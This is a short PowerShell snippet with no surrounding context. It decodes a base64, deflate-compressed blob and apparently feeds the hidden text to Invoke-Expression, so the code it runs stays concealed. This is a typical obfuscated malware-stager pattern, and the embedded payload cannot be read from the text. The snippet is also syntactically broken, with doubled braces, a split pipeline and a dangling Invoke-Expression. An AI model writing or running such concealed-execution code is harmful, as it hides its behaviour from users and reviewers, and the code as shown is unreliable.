(New-Object IO.Compression.DeflateStream [System.IO.MemoryStream][Convert]::FromBase64String @('c08t0Q0oyk9OLS5W0PVLzE1VyMsvSS1ITFGoUUjLL0pNTM7QzU/KSk0uqVaJ1/POzMnR0KwFAA==', [System.IO.Compression.CompressionMode]::Decompress)) | ForEach-Object {
   {
      New-Object System.IO.StreamReader @($_, [System.Text.Encoding]::ASCII);
   }
}
 | ForEach-Object {
   {
      $_.ReadToEnd();
   }
}
Invoke-Expression;
